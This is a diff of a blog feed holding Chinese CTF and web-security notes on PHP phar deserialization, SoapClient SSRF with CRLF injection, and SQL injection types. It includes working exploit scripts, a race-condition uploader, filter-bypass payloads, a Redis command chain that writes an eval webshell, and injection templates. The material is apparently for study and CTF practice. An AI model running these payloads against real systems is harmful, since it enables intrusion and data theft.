+unlink($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;/&#39;.$_GET[&#39;fn&#39;]);：立即删除原始文件（位于Web根目录下）。
+
+这个操作序列创建了一个非常短的时间窗口：文件被写入后，在unlink删除之前，文件短暂存在。攻击者需要在这个时间窗口内通过phar协议访问该文件，以触发phar反序列化漏洞。如果攻击者能在此期间成功访问文件，就能执行反序列化后的恶意代码；否则，文件会被删除，攻击失败。因此，条件竞争是利用此漏洞的关键。
+补充：条件竞争是什么？
+条件竞争（Race Condition）是一种并发编程中的漏洞，当两个或多个进程或线程同时访问共享资源（如文件、数据等）时，最终结果取决于它们执行的相对时序。在Web安全中，攻击者可以利用条件竞争在某个短暂的时间窗口内执行本应被限制的操作，例如在文件被创建但被删除前访问它。
+4.php:
+&lt;?phpclass filter &#123;    public $filename = &#x27;;cat fl*&#x27;;    public $evilfile = true;    public $admin = true;&#125;// 后缀必须为phar$phar = new Phar(&quot;evil.phar&quot;);$phar-&gt;startBuffering();// 设置 stubb$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new filter();/** * 将自定义的 meta-data 存入 manifest * 这个函数需要在php.ini中修改 phar.readonly 为 Off * 否则的话会抛出  * creating archive &quot;***.phar&quot; disabled by the php.ini setting phar.readonly  * 异常. */$phar-&gt;setMetadata($o);// 添加需压缩的文件$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;
+
+运行4.php文件，生成evil.phar文件
+
+条件竞争，py3脚本
+import base64import requestsimport threadingflag = Falseurl = &#x27;ip&#x27;data = open(&#x27;./evil.phar&#x27;, &#x27;rb&#x27;).read()pre_resp = requests.get(url)if pre_resp.status_code != 200:    print(url + &#x27;\n链接好像挂了....&#x27;)    exit(1)def upload():    requests.post(url+&quot;?fn=evil.phar&quot;, data=data)def read():    global flag    r = requests.post(url+&quot;?fn=phar://evil.phar/&quot;, data=&quot;&quot;)    if &quot;ctfshow&#123;&quot; in r.text and flag is False:        print(base64.b64encode(r.text.encode()))        flag = Truewhile flag is False:    a = threading.Thread(target=upload)    b = threading.Thread(target=read)    a.start()    b.start()
+
+绕过：php(phar)反序列化漏洞及各种绕过姿势_throw new 绕过php-CSDN博客
+将phar伪造成其他格式的文件如果文件上传界面后端代码会检查文件类型的话，就需要将 phar 文件未造成其他格式文件
+$_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;
+
+由于php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件
+&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头    $o = new TestObject();    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;
+
+绕过phar关键字检测在第一个实例中，文件成功上传之后使用 phar 伪协议去读取文件，但是如果后端检测参数不能以 phar 开头的话，就需要绕过
+if (preg_match(&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;,$filename)&#123;    die();&#125;
+
+绕过方法：
+// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过compress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///home/sx/test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txtphp://filter/resource=phar:///test.phar/test.txt// 还可以使用伪协议的方法绕过php://filter/read=convert.base64-encode/resource=phar://phar.phar
+
+其中：compress.bzip2:// 和 compress.zlib:// 是 PHP 合法的流包装器，用于处理压缩数据。
+（核心概念：流包装器
+PHP 有一个非常强大的特性叫做“流包装器”。你可以把它理解为一种协议，用于告诉 PHP 如何访问不同的“资源”。我们最熟悉的是 file://（访问本地文件）和 http://（访问网络资源）。
+phar:// 也是一个流包装器，它专门用于读取 PHAR 文件，并在读取时自动反序列化其元数据。这正是 Phar 反序列化漏洞的根源。）
+绕过__HALT_COMPILER特征检测if (preg_match(&quot;/&lt;/?|php|HALT_COMPILER/i&quot;,$filename)&#123;    die();&#125;
+
+因为phar中的a stub字段必须以__HALT_COMPILER();字符串来结尾，否则phar扩展将无法识别这个文件为phar文件，所以这段字符串不能省略，只能绕过
+方法一：
+首先将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了__HALT_COMPILER()，将 phar.gz 后缀改为 png（png文件可以上传）
+文件上传成功后，利用文件包含漏洞包含文件
+file_un.php?filename=phar://pic/phar.phar.gz/phar.phar# file_un.php中包含__destruct并且可以被触发
+
+方法二
+将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过该正则
+$phar_file = serialize($exp);    echo $phar_file;    $zip = new ZipArchive();    $res = $zip-&gt;open(&#x27;1.zip&#x27;,ZipArchive::CREATE);     $zip-&gt;addFromString(&#x27;crispr.txt&#x27;, &#x27;file content goes here&#x27;);    $zip-&gt;setArchiveComment($phar_file);    $zip-&gt;close();
+
+phar反序列化过程中，对metadata进行解析的时候会进行php_var_unserialize()将Phar中的metadata进行反序列化
+
+从一道题再看phar的利用-安全KER - 安全资讯平台
+phar 文件签名修改1.签名结构
+struct phar_signature &#123;    int signature_type;    // 签名算法类型    char *signature;       // 签名数据    int signature_length;  // 签名长度    int flags;             // 标志位&#125;;
+
+签名支持 MD5, SHA1, SHA256, SHA512, OpenSSL 算法, 默认是 SHA1其中末尾的4个字节是固定的, 表示该文件存在签名倒数第8~4个字节表示文件使用的签名算法倒数8个字节往前就是签名的二进制值, 对文件开头到声明签名部分以前的内容进行计算, 长度视算法类型而定
+
+2.核心思路
+当 PHP 遇到无效签名时，默认行为是：
+
+检测到签名不匹配
+抛出警告 (Warning)
+但继续执行 Phar 文件的解析和反序列化
+
+关键点：签名错误不会阻止反序列化执行！
+以 SHA1 为例
+在修改了 phar 数据后, 我们需要更改的就是这部分 (20字节长度) 的内容
+
+脚本，以默认的sha1签名为例：
+from hashlib import sha1with open(&#x27;phar.phar&#x27;, &#x27;rb&#x27;) as file:    f = file.read()     # 修改内容后的phar文件,以二进制文件形式打开s = f[:-28] # 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）h = f[-8:] # 获取签名类型以及GBMB标识，各4个字节newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)with open(&#x27;newPhar.phar&#x27;, &#x27;wb&#x27;) as file:    file.write(newf) # 写入新文件
+
+实例:
+场景：文件上传 + Phar 反序列化
+// 漏洞代码if(isset($_FILES[&#x27;file&#x27;]))&#123;    $upload_file = &#x27;uploads/&#x27;.$_FILES[&#x27;file&#x27;][&#x27;name&#x27;];    move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $upload_file);        // 这里会触发phar反序列化，但忽略签名错误    file_get_contents(&quot;phar://&quot;.$upload_file);&#125;
+
+攻击步骤：
+
+准备恶意 Phar：
+
+class Exploit &#123;    public $cmd = &#x27;system(&quot;cat /etc/passwd&quot;)&#x27;;    function __destruct() &#123;        system($this-&gt;cmd);    &#125;&#125;$phar = new Phar(&#x27;exploit.phar&#x27;);$phar-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;text&#x27;);$phar-&gt;setMetadata(new Exploit());$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);
+
+​           2.修改 payload：
+# kali中使用十六进制编辑器修改 metadata 中的命令# 将二进制文件转换为十六进制文本xxd exploit.phar &gt; exploit.hex# 使用 vim 编辑vim exploit.hex# 编辑完成后转换回二进制xxd -r exploit.hex &gt; exploit_modified.phar
+
+​           3.上传并触发：
+// 上传修改后的 exploit.phar// 访问触发页面，虽然会有警告，但命令已执行
+
+使用 tar 绕过签名phar 协议对 tar 的处理跟 gzip bzip2 这些不太一样
+对 gzip bzip2 处理时, PHP 会将其解压缩, 然后解析里面的 phar 文件
+而对 tar 处理时, PHP 会检测压缩包中是否存在 .phar/.metadata, 存在的话就会将 .metadata 里的内容直接进行反序列化
+
+传统 Phar 流程：
+phar://malicious.phar → 验证签名 → 解析manifest → 反序列化metadata
+
+Tar 绕过流程：
+phar://malicious.tar → 按tar格式解析 → 查找.phar/.metadata → 直接反序列化
+
+关键区别：tar 格式的处理跳过了 Phar 签名验证步骤！
+
+测试代码
+&lt;?phpclass A&#123;    public $text = &#x27;test&#x27;;    function __destruct()&#123;        echo $this-&gt;text;    &#125;    function __wakeup()&#123;        $this-&gt;text = &#x27;fail&#x27;;    &#125;&#125;file_get_contents($_GET[&#x27;a&#x27;]);?&gt;
+
+本地创建 .phar 文件夹和 .metadata 文件
+exp10it@LAPTOP-TBAF1QQG:~/WWW/.phar$ ls -a.metadataexp10it@LAPTOP-TBAF1QQG:~/WWW/.phar$ cat .metadataO:1:&quot;A&quot;:2:&#123;s:4:&quot;text&quot;;s:7:&quot;success&quot;;&#125;
+
+tar 压缩, 必须是 Linux 环境
+tar -cf phar.tar .phar/
+
+访问 index.php?a=phar://phar.tar
+
+✔️例题：[0xGame_2025]文件查询器（蓝）（file_get_contents触发phar反序列化）在文件查询中查询index.php，base64编码，解码得到源码
+&lt;?phperror_rporting(0);class MaHaYu&#123;    public $HG2;    public $ToT;    public $FM2tM    public function __construct()    &#123;      $this -&gt; ZombiegalKawaii();    &#125;        public function ZombiegalKawaii()    &#123;      $HG2 = $this -&gt; HG2;      if(preg_match(&quot;/system|print|readfile|get|assert|passthru|nl|flag|ls|scandir|check|cat|tac|echo|eval|rev|report|dir/i&quot;,$HG2))      &#123;        die(&quot;这这这你也该绕过去了吧&quot;);      &#125;      else&#123;        $this -&gt; ToT = &quot;这其实是来占位的&quot;;      &#125;    &#125;    public function __destruct()    &#123;      $HG2 = $this -&gt; HG2;      $FM2tM = $this -&gt; FM2tM;      echo &quot;Wow&quot;;      var_dump($HG2($FM2tM));    &#125;&#125;$file=$_POST[&#x27;file&#x27;];if(isset($_POST[&#x27;file&#x27;]))&#123;    if (preg_match(&quot;/&#x27;[\$%&amp;#@*]|flag|file|base64|go|git|login|dict|base|echo|content|read|convert|filter|date|plain|text|;|&lt;|&gt;/i&quot;, $file))    &#123;        die(&quot;对方撤回了一个请求，并企图萌混过关&quot;);    &#125;    echo base64_encode(file_get_contents($file));&#125;
+
+因为是文件上传，再查询upload.php，获得文件上传的代码
+&lt;?phperror_reporting(0);$White_List = array(&quot;jpg&quot;, &quot;png&quot;, &quot;pdf&quot;);$temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);$extension = end($temp);if (($_FILES[&quot;file&quot;][&quot;size&quot;] &amp;&amp; in_array($extension, $White_List)))&#123;       //file_get_contents触发phar反序列化    $content=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);    $pos = strpos($content, &quot;__HALT_COMPILER();&quot;);    if(gettype($pos)===&quot;integer&quot;)    &#123;        die(&quot;你猜我想让你干什么喵&quot;);    &#125;    else    &#123;        if (file_exists(&quot;./upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))        &#123;            echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; Already exists. &quot;;        &#125;        else        &#123;             $file = fopen(&quot;./upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;], &quot;w&quot;);            fwrite($file, $content);             fclose($file);            echo &quot;Success ./upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];        &#125;    &#125;&#125;else&#123;     echo &quot;请重新尝试喵&quot;; &#125; ?&gt;
+
+file_get_contents触发phar反序列化,gz压一下，改一下文件名分别绕过内容waf和文件名waf
+
+*生成恶意的序列化MaHaYu对象*：创建一个MaHaYu对象，其中$HG2设置为getenv（用于读取环境变量），$FM2tM设置为FLAG（假设flag存储在环境变量FLAG中）。序列化该对象。
+*创建phar文件*：将序列化对象作为元数据嵌入到phar文件中。
+*压缩phar文件*：将phar文件压缩为.gz格式，以避免upload.php检测到__HALT_COMPILER();字符串。
+*上传压缩文件*：将压缩后的phar文件上传为jpg文件，通过upload.php。
+*触发反序列化*：通过index.php的file参数，使用phar协议访问上传的文件，触发反序列化，从而执行getenv(“FLAG”)获取flag。
+
+&lt;?phperror_reporting(0);class MaHaYu&#123;    public $HG2;    public $ToT;    public $FM2tM;    public function __construct()    &#123;      $this -&gt; ZombiegalKawaii();    &#125;        public function ZombiegalKawaii()    &#123;      $HG2 = $this -&gt; HG2;      if(preg_match(&quot;/system|print|readfile|get|assert|passthru|nl|flag|ls|scandir|check|cat|tac|echo|eval|rev|report|dir/i&quot;,$HG2))      &#123;        die(&quot;这这这你也该绕过去了吧&quot;);      &#125;      else&#123;        $this -&gt; ToT = &quot;这其实是来自各位的&quot;;       &#125;    &#125;     public function __destruct()    &#123;      $HG2 = $this -&gt; HG2;      $FM2tM = $this -&gt; FM2tM;      echo &quot;Wow&quot;;      var_dump($HG2($FM2tM));    &#125;&#125;$a = new MaHaYu();$a -&gt; HG2 = &quot;getenv&quot;;$a-&gt;FM2tM=&quot;FLAG&quot;;    //本来用glob发现根目录无flag，直接看环境就好了  $phar = new Phar(&quot;2.phar&quot;); //.phar文件$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;); //固定的$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //随便写点什么生成个签名，添加要压缩的文件$phar-&gt;stopBuffering(); $fp = gzopen(&quot;2.phar.gz&quot;, &#x27;w9&#x27;);gzwrite($fp, file_get_contents(&quot;2.phar&quot;));gzclose($fp); // 将 2.phar.gz 重命名为 2.phar.png@rename(&quot;2.phar.gz&quot;, &quot;1.phar.png&quot;);?&gt;
+
+将代码保存到1.php里，在kali里运行，生成1.phar.png和2.phar文件
+
+回到文件上传，上传生成的1.phar.php文件
+然后打phar协议就好了
+phar://upload/1.phar.png
+
+
+0xGame{Y0u_Are_Rea11y_a_Ph4r_G0d!}
+相关习题：[CISCN2019 华北赛区 Day1 Web1]Dropbox
+[CISCN2019 华北赛区 Day1 Web1]Dropbox复现_51CTO博客_[ciscn2019 华北赛区 day1 web1]dropbox
+Gzip 和 Bzip2：压缩算法在 PHP 流包装器中的对应关系
+PHP 提供了对应的流包装器来处理这些压缩格式：
+
+
+
+压缩格式
+PHP 流包装器
+
+
+
+Gzip
+compress.zlib://
+
+
+Bzip2
+compress.bzip2://
+
+
+技术细节对比
+// Gzip 压缩流compress.zlib://file.gzcompress.zlib://phar:///test.phar/test.txt// Bzip2 压缩流  compress.bzip2://file.bz2compress.bzip2://phar:///test.phar/test.txt
+
+在 Phar 反序列化绕过中的应用
+在绕过场景中，两者的作用是完全相同的：
+// 两种方式都能达到同样的绕过效果compress.zlib://phar:///malicious.phar/test.txtcompress.bzip2://phar:///malicious.phar/test.txt
+
+
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>phar</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -9105,65 +9105,6 @@ Redis内存释放后重用超危漏洞(CVE-2025-49844)：深度风险提示与�
       </tags>
   </entry>
   <entry>
-    <title>SoapClient 进行 SSRF + CRLF</title>
-    <url>/2026/08/24/soapclient-ssrf-crlf/</url>
-    <content><![CDATA[0x01 什么是SoapSOAP是webService三要素（SOAP、WSDL、UDDI）之一：
-
-WSDL 用来描述如何访问具体的接口。
-
-UDDI用来管理，分发，查询webService。
-
-SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。
-
-
-0x02 PHP中的SoapClient类参考链接：https://www.php.net/manual/zh/soapclient.soapclient.php
-PHP 的 SOAP 扩展可以用来提供和使用 Web Services，这个扩展实现了6个类，其中的SoapClient类是用来创建soap数据报文，与wsdl接口进行交互的，同时这个类下也是有反序列化中常常用到的__call()魔术方法。
-该类的构造函数如下：
-public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）
-
-第一个参数是用来指明是否是wsdl模式。
-第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。
-
-知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。
-我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url，如下
-&lt;?php$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &quot;http://xxx.xxx.xxx&quot;,                                     &#x27;uri&#x27;      =&gt; &quot;123&quot;));echo serialize($a);?&gt;
-
-当把上述脚本得到的序列化串进行反序列化（unserialize），并执行一个SoapClient没有的成员函数时，会自动调用该类的__Call方法，然后向target_url发送一个soap请求，并且uri选项是我们可控的地方。
-0x03 CRLF InjectionCRLF是”回车 + 换行”(\r\n)的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。
-参考链接：CRLF Injection漏洞的利用与实例分析https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html
-0x04 SSRF+CRLF攻击内网实际上很多时候都需要这两个漏洞配合在一起使用，当我们我们可以从外网调用到soap的api，而攻击目标是在内网，那么就可以利用SoapClient进行SSRF攻击内网，然后配合CRLF构造POST请求增加我们的攻击面。
-那么为什么在用SoapClient类进行SSRF的时候会有CRLF注入的问题呢？如下：
-
-可以看到options参数中还有一个选项为user_agent，运行我们自己设置User-Agent的值。
-当我们可以控制User-Agent的值时，也就意味着我们完全可以构造一个POST请求，因为Content-Type为和Content-Length都在User-Agent之下，而控制这两个是利用CRLF发送post请求最关键的地方。
-最后给出wupco师傅的生成任意POST报文的POC:
-&lt;?php$target = &#x27;http://123.206.216.198/bbb.php&#x27;;$post_string = &#x27;a=b&amp;flag=aaa&#x27;;$headers = array(    &#x27;X-Forwarded-For: 127.0.0.1&#x27;,    &#x27;Cookie: xxxx=1234&#x27;    );$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;,&#x27;%0d%0a&#x27;,$aaa);$aaa = str_replace(&#x27;&amp;&#x27;,&#x27;%26&#x27;,$aaa);echo $aaa;?&gt;
-
-原文链接：https://blog.csdn.net/qq_42181428/article/details/100569464
-真的是反序列化(利用SoapClient触发__call用ssrf来打Redis)&lt;?phphighlight_file(__FILE__);error_reporting(0);//hint: Redis20251206class pure&#123;    public $web;    public $misc;    public $crypto;    public $pwn;    public function __construct($web, $misc, $crypto, $pwn)&#123;        $this-&gt;web = $web;        $this-&gt;misc = $misc;        $this-&gt;crypto = $crypto;        $this-&gt;pwn = $pwn;    &#125;    public function reverse()&#123;        $this-&gt;pwn = new $this-&gt;web($this-&gt;misc, $this-&gt;crypto);    &#125;    public function osint()&#123;        $this-&gt;pwn-&gt;play_0xGame();    &#125;    public function __destruct()&#123;        $this-&gt;reverse();        $this-&gt;osint();    &#125;&#125;$AI = $_GET[&#x27;ai&#x27;];$ctf = unserialize($AI);?&gt;
-
-发现没有POP链，但注意到这边 $this-&gt;pwn-&gt;play_0xGame(); 引⽤了⼀个不存在的函
-数，可以想到⽤SoapClient类，刚好访问不存在的函数可以触发它⾥⾯的 __call() ，⽽且hint写
-了 Redis20251206 ，很明显是⽤SoapClientSSRF来打Redis，⽽后⾯的20251206就是Redis的密码
-📌
-*利用SoapClient类进行SSRF+CRLF攻击:*
-https://blog.csdn.net/qq_42181428/article/details/100569464
-*soap导致的SSRF*:
-https://xz.aliyun.com/news/2640
-&lt;?phpclass pure&#123;public $web;public $misc;public $crypto;public $pwn;&#125;$a = new pure();$a-&gt;web = &#x27;SoapClient&#x27;;$a-&gt;misc = null;$target = &#x27;http://127.0.0.1:6379/&#x27;;$poc = &quot;AUTH 20251206\r\nCONFIG SET dir /var/www/html/\r\nCONFIG SETdbfilename shell.php\r\nSET x &#x27;&lt;?= @eval(\$_POST[1]) ?&gt;&#x27;\r\nSAVE&quot;;$a-&gt;crypto = array(&#x27;location&#x27; =&gt; $target, &#x27;uri&#x27; =&gt; &quot;hello\&quot;\r\n&quot; . $poc .&quot;\r\nhello&quot;);echo urlencode(serialize($a));
-
-然后蚁剑连接后env即可
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>SSRF</tag>
-        <tag>CRLF</tag>
-        <tag>SoapClient</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQL 注入的原理及测试</title>
     <url>/2026/08/24/sql-injection-principles/</url>
     <content><![CDATA[SQL 注入原理：SQL 注入的本质是代码与数据未分离。当用户可控的输入被直接拼接到 SQL 语句中执行时，攻击者可以通过构造恶意输入改变原有 SQL 的逻辑，从而执行非预期的数据库操作。
@@ -9409,555 +9350,6 @@ union 能用
 啥都没有
 时间盲注
 
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL 注入类型</title>
-    <url>/2026/08/24/sql-injection-types/</url>
-    <content><![CDATA[1. 数字型注入原理：参数为数字直接拼 SQL，无引号包裹，输入 &#39; 直接报错。
-代码特征：参数直接拼接，无任何引号包裹。
-$sql = &quot;SELECT * FROM users WHERE id = &quot;.$_GET[&#x27;id&#x27;];
-
-危险函数：
-mysqli_query($conn, $sql)    // MySQLi 过程化$pdo-&gt;query($sql)            // PDOmysql_query($sql)            // 老版本 MySQL 扩展
-
-
-注入模板-- ① 判断列数?id=1 order by 3--+-- ② 判断回显位?id=-1 union select 1,2,3--+-- ③ 查库名?id=-1 union select 1,database(),3--+-- ④ 查表名?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+?id=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1--+-- ⑤ 查列名?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;表名&#x27;--+?id=-1 union select 1,column_name,3 from information_schema.columns where table_name=&#x27;表名&#x27; limit 0,1--+-- ⑥ 拿数据?id=-1 union select 1,group_concat(username,0x3a,password),3 from 表名--+?id=-1 union select 1,concat(username,0x3a,password),3 from 表名 limit 0,1--+-- ⑦ 显示不全（substr 分段读，每段32位）?id=-1 union select 1,substr(group_concat(flag),1,32),3 from flag--+?id=-1 union select 1,substr(group_concat(flag),33,32),3 from flag--+
-
-
-过滤绕过速查
-
-
-过滤
-绕过
-示例
-
-
-
-空格
-/**/ %09 %0a 括号
-?id=1/**/union/**/select/**/1,2,3--+
-
-
-union select
-双写、内联注释、换行
-?id=1 ununionion seselectlect 1,2,3--+
-
-
-and &#x2F; or
-&amp;&amp;、 双写
-?id=1 &amp;&amp; 1=1 ?id=1 anAndd 1=1
-
-
-单引号
-十六进制字符串
-table_name=0x7573657273
-
-
-等号 &#x3D;
-like regexp &gt; &lt;
-?id=1 and 1 like 1--+
-
-
-注释 # –
-;%00 闭合后引号
-?id=1 union select 1,2,3;%00
-
-
-逗号 ,
-from x for y join
-substr((select database())from 1 for 1)
-
-
-sleep
-benchmark()
-and benchmark(10000000,md5(1))--+
-
-
-information_schema
-sys.schema_auto_increment_columns
-select table_name from sys.schema_auto_increment_columns
-
-
-order by
-group by
-?id=1 group by 3--+
-
-
-
-2. 字符型注入原理：参数用单&#x2F;双引号包裹，需闭合引号再注入。
-代码特征：参数被单引号或双引号包裹。
-$sql = &quot;SELECT * FROM users WHERE username = &#x27;&#123;$_GET[&#x27;user&#x27;]&#125;&#x27;&quot;;$sql = &quot;select passwd from user where username=&#x27;&quot;.$username.&quot;&#x27; order by id limit 1;&quot;;
-
-危险函数：
-mysqli_query($conn, $sql)$pdo-&gt;query($sql)
-
-
-注入模板-- ① 判断列数?user=admin&#x27; order by 3--+-- ② 判断回显位?user=admin&#x27; and 1=2 union select 1,2,3--+-- ③ 查库名?user=admin&#x27; and 1=2 union select 1,database(),3--+-- ④ 查表名?user=admin&#x27; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+?user=admin&#x27; and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1--+-- ⑤ 查列名?user=admin&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;表名&#x27;--+-- ⑥ 拿数据?user=admin&#x27; and 1=2 union select 1,group_concat(username,0x3a,password),3 from users--+-- ⑦ 显示不全?user=admin&#x27; and 1=2 union select 1,substr(group_concat(flag),1,32),3 from flag--+
-
-
-过滤绕过速查
-
-
-过滤
-绕过
-示例
-
-
-
-单引号
-宽字节 %df&#39; 十六进制
-?id=1%df&#39; union select 1,2,3--+
-
-
-addslashes()
-宽字节、二次注入
-%df&#39; 吃反斜杠
-
-
-双引号
-先闭合双引号
-?user=admin&quot; and 1=2 union select 1,2,3--+
-
-
-空格&#x2F;关键字
-同数字型
-双写、大小写、注释
-
-
-
-3. 搜索型注入（LIKE）原理：用户输入拼入 LIKE &#39;%...%&#39;，开发以为有 % 包裹就安全。
-代码特征：参数在 &#39;%...%&#39; 中间。
-$sql = &quot;SELECT * FROM users WHERE name LIKE &#x27;%&#123;$_GET[&#x27;kw&#x27;]&#125;%&#x27;&quot;;
-
-危险函数：
-mysqli_query($conn, $sql)
-
-
-注入模板-- ① 闭合测试?kw=%&#x27; and 1=1--+?kw=%&#x27; and 1=2--+-- ② 查库名?kw=%&#x27; and 1=2 union select 1,database(),3--+-- ③ 查表名?kw=%&#x27; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+-- ④ 查列名?kw=%&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;表名&#x27;--+-- ⑤ 拿数据?kw=%&#x27; and 1=2 union select 1,group_concat(username,0x3a,password),3 from users--+-- ⑥ 显示不全?kw=%&#x27; and 1=2 union select 1,substr(group_concat(flag),1,32),3 from flag--+
-
-
-过滤绕过速查
-
-
-过滤
-绕过
-说明
-
-
-
-单引号
-宽字节 %df%25&#39;
-% 也要考虑编码
-
-
-百分号 %
-_ 匹配单字符
-LIKE &#39;_dmin&#39;
-
-
-空格&#x2F;关键字
-同字符型
-双写、大小写
-
-
-
-4. 排序注入（ORDER BY）原理：ORDER BY 后字段名用户可控，无法预编译，开发直接拼接。重灾区。
-代码特征：参数在 ORDER BY 后面，通常是排序字段或排序方式。
-$sql = &quot;SELECT * FROM users ORDER BY &#123;$_GET[&#x27;sort&#x27;]&#125;&quot;;
-
-危险函数：
-mysqli_query($conn, $sql)
-
-
-注入模板-- ===== 报错注入（首选） =====-- 查库名?sort=updatexml(1,concat(0x7e,database(),0x7e),1)-- 查表名?sort=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)-- 查列名?sort=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;),0x7e),1)-- 拿数据?sort=updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)-- 显示不全?sort=updatexml(1,concat(0x7e,substr((select group_concat(flag) from flag),1,32),0x7e),1)-- ===== 布尔盲注（无报错时用） =====-- 库名长度?sort=if(length(database())=8,id,username)-- 逐字猜库名?sort=if(ascii(substr(database(),1,1))=115,id,username)-- ===== 时间盲注 =====?sort=if(1=1,sleep(5),id)
-
-
-过滤绕过速查
-
-
-过滤
-绕过
-示例
-
-
-
-逗号 ,
-from x for y
-substr((select database())from 1 for 1)
-
-
-if()
-case when ... then ... end
-?sort=case when 1=1 then id else username end
-
-
-sleep
-benchmark()
-?sort=if(1=1,benchmark(10000000,md5(1)),id)
-
-
-updatexml
-extractvalue() floor()
-?sort=extractvalue(1,concat(0x7e,database()))
-
-
-空格
-/**/ 括号
-注释代替空格
-
-
-
-5. LIMIT 注入原理：LIMIT 后偏移量&#x2F;数量用户可控，直接拼接。
-代码特征：参数在 LIMIT 后面，常见于分页。
-$sql = &quot;SELECT * FROM users LIMIT &#123;$_GET[&#x27;page&#x27;]&#125;,10&quot;;
-
-危险函数：
-mysqli_query($conn, $sql)
-
-
